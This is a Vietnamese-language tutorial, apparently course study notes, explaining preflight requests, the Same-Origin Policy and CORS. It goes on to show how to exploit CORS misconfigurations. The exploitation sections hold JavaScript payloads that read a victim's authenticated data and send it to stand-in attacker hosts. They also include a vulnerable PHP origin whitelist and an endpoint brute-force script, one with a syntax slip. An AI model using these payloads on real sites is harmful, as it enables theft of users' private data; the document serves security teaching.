# Simple Request

Là những request có thể được tạo bởi HTML thuần mà không sử dụng JS. Bao gồm:

* `GET` or `HEAD` requests without any custom `HTTP headers`
* `POST` requests without any custom `HTTP headers` and `Content-Type` of either `application/x-www/form-urlencoded`, `multipart/form-data` or `text/plain`

Custom HTTP headers ở đây là những header nằm ngoài danh sách mặc định, ví dụ như: `Authorization`, `X-API-Key`, ...

# Preflight Request

Một request thỏa mãn 2 điều kiện:

* Không phải là `simple request`
* Cross-Origin: từ origin A gọi qua origin B

Thì trước khi gửi request chính, trình duyệt sẽ thực hiện gửi 1 `preflight request` kèm theo 1 số thông tin của request gốc (method, custom header, origin) trước nhằm hỏi server xem có cho phép gửi request gốc hay không qua cấu hình `CORS`.

`Preflight  request` là 1 `OPTIONS` request chứa 2 trường:

* **Access-Control-Request-Method**: thông báo với server về `HTTP method` của request gốc
* **Access-Control-Request-Headers**: thông báo với server về `custom HTTP headers` của request gốc

Ví dụ: Khi website `https://shop.com` gọi tới api `https://api.shop.com` để lấy data qua method `GET` kèm headers `Authorization`

```http
GET /users HTTP/1.1
Host: api.shop.com
Authorization: Bearer <token>
...
```
Ở đây thỏa mãn 2 điều kiện ở trên, nên trước khi request gốc được gửi nó sẽ thực hiện gửi một `preflight request`

```http
OPTIONS /users HTTP/1.1
Host: api.shop.com
Origin: https://shop.com
Access-Control-Request-Method: GET
Access-Control-Request-Headers: authorization
```
Lúc này, ở bên phía api cần phải cấu hình CORS chính xác để cho phép request, nếu không request này sẽ bị chặn.

# Same Origin Policy (SOP)

SOP là cơ chế được triển khai trong trình duyệt web nhằm ngăn chặn việc truy cập giữa các website khác `origin`. 

**Origin**: được định nghĩa dựa trên 3 thành phần

```
schema, host, port
https example.com 80
```

Chỉ cần 1 trong 3 thành phần này khác nhau nó được coi là `cross-origin`. 

SOP sinh ra để nhằm ngăn đánh cắp dữ liệu giữa các origin: script trên một origin không thể tùy ý đọc dữ liệu thuộc một origin khác, giúp ngăn các website độc hại đánh cắp thông tin.

Ví dụ: website `attacker.com` không thể tùy ý đọc dữ liệu từ `bank.com` thông qua JS.

**Note**: Nếu 1 request là `simple request` và `cross origin`, thì request vẫn sẽ được gửi đi. Nó chỉ không đọc được response nếu không được `CORS` cho phép thôi.

Ví dụ: website `attacker.com` vẫn có thể fetch simple request tới `bank.com` thông qua JS nhưng không thể đọc được response trả về nếu CORS của bank.com không cho phép.

Tuy nhiên, trình duyệt vẫn cho phép trang web nhúng 1 số tài nguyên từ  `cross-origin` thông qua các thẻ HTML như `<img>`, `<video>`, `<script>`.

Ví dụ:

```html
<!DOCTYPE html>
<html>
<body>
<script>
var img = document.createElement("img");
img.setAttribute("src",
"https://academy.hackthebox.com/images/logo.svg");
document.body.appendChild(img);
</script>
</body>
</html>
```

# Cross-Origin Resource Sharing (CORS)

CORS là một cơ chế được xây dựng dựa trên các HTTP headers, cho phép máy chủ quy định những origin nào được phép truy cập tài nguyên `cross-origin` và những phương thức, request headers nào được chấp nhận. CORS được xem là cơ chế mở rộng có kiểm soát các giới hạn của Same-Origin Policy (SOP).

CORS hoạt động thông qua việc máy chủ gửi các CORS headers trong HTTP response để trình duyệt kiểm tra quyền truy cập cross-origin.

Các `CORS Headers` quan trọng:

* `Access-Control-Allow-Origin`: xác định origin được phép truy cập tài nguyên cross-origin
* `Access-Control-Expose-Headers`: định nghĩa những custom headers trong response mà Javascript có thể đọc
* `Access-Control-Allow-Methods`: được sử dụng trong phản hồi Preflight, cho biết server chấp nhận những method nào
* `Access-Control-Allow-Headers`: được sử dụng trong phản hồi Preflight, cho biết server chấp nhận những custom header nào
* `Access-Control-Allow-Credentials`: cho phép trình duyệt chia sẻ response với JS nếu request sử dụng credentials mode include
* Access-Control-Max-Age: quy định thời gian trình duyệt lưu cache kết quả của Preflight request phục vụ cho những request cùng origin, header, method

**Note**: có một cấu hình không hợp lệ đó là khi kết hợp `Access-Control-Allow-Origin: *` và `Access-Control-Allow-Credentials: true`

Đây là cấu hình không hợp lệ, CORS check trong trường hợp này fail và JS không đọc được response. Trình duyệt sẽ báo lỗi CORS trong console. Để cho phép request có credentials, server phải chỉ định origin cụ thể mà không chấp nhận wildcard như thông thường:

```
Access-Control-Allow-Origin: https://frontend.example.com
Access-Control-Allow-Credentials: true
```

Ví dụ: 

Khi mà origin `attacker.com` thực hiện gửi simple request tới `bank.com`

```html
# Tại attacker.com

<script>
xhr = new XMLHttpRequest();
xhr.open('GET', 'https://bank.com/profile');
xhr.onload = () => {
    location = "https://attacker.com/log?data=" + btoa(xhr.response);
};
xhr.send();
</script>
```

```http
GET /profile HTTP/1.1
Host: bank.com
Origin: http://attacker.com
```
Thì để `attacker.com` đọc được response, tại `bank.com` chỉ cần cấu hình `Access-Control-Allow-Origin: http://attacker.com`

Một ví dụ khác:

Khi mà origin `attacker.com` thực hiện gửi complex request tới `bank.com`

```html
<script>
xhr = new XMLHttpRequest();
xhr.open('GET', 'https://bank.com/profile');
xhr.withCredentials = true;
xhr.setRequestHeader('XYZ', 'secret');
xhr.onload = () => {
    location = "http://attacker.com/log?data=" + btoa(xhr.response);
};
xhr.send();
</script>
```
Vì đây không phải là 1 simple request nên nó sẽ thực hiện gửi 1 preflight request trước

```http
OPTIONS /profile HTTP/1.1
Host: bank.com
Origin: http://attacker.com
Access-Control-Request-Methods: GET
Access-Control-Request-Headers: XYZ
```

Để request gốc được gửi, bên server phải cấu hình để preflight request này trả về:

```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: http://origin.com
Access-Control-Allow-Headers: XYZ
Access-Control-Allow-Methods: GET
Access-Control-Allow-Credentials: true
```
Sau đó, request gốc mới được gửi đi và ở request này backend cũng cần cấu hình CORS tương tự như trên để JS có thể đọc được response.

# CORS Misconfiguration

## Arbitray Origin Reflection

Vì lí do bảo mật, `Access-Control-Allow-Origin: *` không được dùng để kết hợp với `Access-Control-Allow-Credentials: true`. Kể cả `Access-Control-Allow-Origin: https://*.bank.com`. Tuy nhiên, một số ứng dụng web lại muốn cho phép credentials trên nhiều origin. Để triển khai việc này, một số vulnerability web thực hiện lấy `Origin header` và reflect nó lại trong `Access-Control-Allow-Origin`. Cách này tương tự như như việc dùng `Access-Control-Allow-Origin: *`.

Để test, ta đơn giản chỉ cần sử dụng Burp và thử thay đổi trường Origin xem nó có được reflected lại trong `Access-Control-Allow-Origin` không.

## Improper Origin Whitelist

Thay vì reflecting arbitray origins, server có thể thực hiện check nó với 1 danh sách whitelist origin. Nếu cơ chế này triển khai theo dạng check prefix hay suffix thì có thể dẫn đến vulnerability.

```php
...
$whitelist = ['bank.com', 'shop.com', 'internal.com'];
$origin = $_REQUEST['HTTP_ORIGIN'] ?? '';
foreach($whitelist as $domain) {
    if(strpos($origin, $domain) !== false){
        header("Access-Control-Allow-Origin: $origin");
        break;
    }
}
```
Ta khai thác tương tự như trên, chỉ khác là ta cần thêm chuỗi chứa trong whitelist.

```html
# Tại http://attacker.com

<script>
    xhr = new XMLHttpRequest();
    xhr.open('GET', 'https://vulnerabilitybank.com');
    xhr.withCredentials = true;
    xhr.onload = () => {
        location = "http://attacker.com/log?data=" + btoa(xhr.response);
    };
    xhr.send();
</script>
```

Sau do, gui duong dan `http://attacker.com` nay cho victim. Khi victim truy cap, ta co the lay du lieu cua victim.

## Trusted null origin

Một sai lầm khi cấu hình nữa đó là set `Access-Control-Allow-Origin: null`. Attacker có thể sử dụng nhiều cách để force origin trở thành `null`

Example: 

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms"
src="data:text/html,<script>
var xhr = new XMLHttpRequest();
xhr.open('GET', 'http://api.vulnerablesite.htb/data', true);
xhr.withCredentials = true;
xhr.onload = () => {
location = 'http://exfiltrate.htb/log?data=' + btoa(xhr.response);
};
xhr.send();
</script>"></iframe>
```

## Targeting the local network

Nếu internal web application cấu hình CORS misconfiguration mà trusts the attacker's origin. Ví dụ, intenal API không yêu cầu credentials và `Access-Control-Allow-Origin: *`.

Ta có thể khai thác:

```html
<script>
    xhr = new XMLHttpRequest();
    xhr.open('GET', 'http://localhost/api/users');
    xhr.onload = () => {
        location = 'https://attacker.com/log?data=' + btoa(xhr.response);
    };
    xhr.send();
</script>
```
Thậm chí, trong trường hợp ta không biết IP và port hay endpoint của ứng dụng đang chạy đằng sau. Ta vẫn có thể xây dựng một script để tự động bruteforce. 

```html
<script>
    var endpoints = ['/api/users', '/profile', '/admin', '/account', '/token'];
    for (i in endpoints){
        try {
            var xhr = new XMLHttpRequest();
            xhr.open('GET', `https://api.vulnerability${endpoints[i])`, false);
            xhr.send();
            if(xhr.status != 404){
                var exfil = new XMLHttpRequest();
                exfil.open("GET", "https://attacker.com/log?data=" + btoa(endpoints[i]), false);
                exfil.send();
            }
        } catch {
            // ...
        }
    }
</script>
```

**Note**: khi thực hiện trích xuất toàn bộ site, ta không nên gửi qua params vì nó sẽ bị giới hạn nếu response length quá lớn. Thay vào đó, ta có thể sử dụng POST hoặc chỉ lấy ra những trường mà mình nhắm tới.

# Prevention

- Tránh sử dụng `Access-Control-Allow-Origin: null` và `Access-Control-Allow-Origin: *`
- Nên chỉ định origin cụ thể thay vì wildcard

